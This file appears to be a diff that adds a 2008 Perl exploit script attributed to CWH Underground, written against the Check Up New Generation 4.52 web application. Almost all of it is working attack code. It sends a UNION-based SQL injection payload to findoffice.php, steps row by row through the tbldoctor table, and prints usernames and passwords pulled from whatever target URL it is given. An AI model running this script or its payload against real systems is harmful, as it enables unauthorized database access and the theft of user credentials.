@@ -1,0 +1,96 @@
+#!/usr/bin/perl -w
+#=====================================================================
+# Check New 4.52 (findoffice.php search) Remote SQL Injection Exploit
+#=====================================================================
+#
+#  ,--^----------,--------,-----,-------^--,
+#  | |||||||||   `--------'     |          O	.. CWH Underground Hacking Team ..
+#  `+---------------------------^----------|
+#    `\_,-------, _________________________|
+#      / XXXXXX /`|     /
+#     / XXXXXX /  `\   /
+#    / XXXXXX /\______(
+#   / XXXXXX /           
+#  / XXXXXX /
+# (________(             
+#  `------'
+#
+#AUTHOR : CWH Underground
+#DATE   : 3 December 2008
+#SITE   : cwh.citec.us
+#
+#
+#####################################################
+#APPLICATION : Check Up New Generation
+#VERSION     : 4.52
+#VENDOR	     : http://checkup.sourceforge.net/
+#DOWNLOAD    : http://downloads.sourceforge.net/checkup/checknew_4.52.zip
+######################################################
+#
+#Note: magic_quotes_gpc = off
+#
+#######################################################################################
+#Greetz      : ZeQ3uL, BAD $ectors, Snapter, Conan, JabAv0C, Win7dos, Gdiupo, GnuKDE, JK
+#Special Thx : asylu3, str0ke, citec.us, milw0rm.com
+#######################################################################################
+
+
+use LWP::UserAgent;
+use HTTP::Request;
+
+my $sis="$^O";if ($sis eq 'MSWin32') { system("cls"); } else { system("clear"); }
+
+if ($#ARGV+1 != 2)
+{
+   print "\n==============================================\n";
+   print "    Check New Remote SQL Injection Exploit   \n";
+   print "                                              \n";
+   print "        Discovered By CWH Underground         \n";
+   print "==============================================\n";
+   print "                                              \n";
+   print "  ,--^----------,--------,-----,-------^--,   \n";
+   print "  | |||||||||   `--------'     |          O	\n";
+   print "  `+---------------------------^----------|   \n";
+   print "    `\_,-------, _________________________|   \n";
+   print "      / XXXXXX /`|     /                      \n";
+   print "     / XXXXXX /  `\   /                       \n";
+   print "    / XXXXXX /\______(                        \n";
+   print "   / XXXXXX /                                 \n";
+   print "  / XXXXXX /   .. CWH Underground Hacking Team ..  \n";
+   print " (________(                                   \n";
+   print "  `------'                                    \n";
+   print "                                              \n"; 
+   print "Usage  : ./xpl.pl <URL to PATH> <Dump Limit>\n";
+   print "Example: ./xpl.pl http://www.target.com/checknew 10\n";
+   exit();
+}
+
+$target  = ($ARGV[0] =~ /^http:\/\//) ?  $ARGV[0]:  'http://' . $ARGV[0];
+$number = $ARGV[1];
+
+print "\n++++++++++++++++++++++++++++++++++++++++++++++++++++++";
+print "\n  ..:: SQL Injection Exploit By CWH Underground ::.. ";
+print "\n++++++++++++++++++++++++++++++++++++++++++++++++++++++\n";
+print "\n[+]Dump Username and Password\n";
+
+for ($start=0;$start<$number;$start++) {
+
+$xpl = LWP::UserAgent->new() or die "Could not initialize browser\n";
+$req = HTTP::Request->new(GET => $target."/findoffice.php?search=admin%%27%20and%201=2%20union%20select%201,concat(0x3a3a3a,Name,0x3a3a,Password,0x3a3a3a),3,4,5,6,7,8,9 from tbldoctor limit 1 offset ".$start."--+and+1=1&Submit=%A4%E9%B9%CB%D2")or die "Failed to Connect, Try again!\n";
+$res = $xpl->request($req);
+$info = $res->content;
+$count=$start+1;
+
+if ($info =~ /:::(.+):::/)
+{
+$dump=$1;
+($username,$password)= split('::',$dump);
+printf "\n [$count]\n [!]Username = $username \n [!]Password = $password\n";
+}
+else { 
+	print "\n [*]Exploit Done !!" or die "\n [*]Exploit Failed !!\n";
+	exit;
+}
+}
+
+# milw0rm.com [2008-12-03]
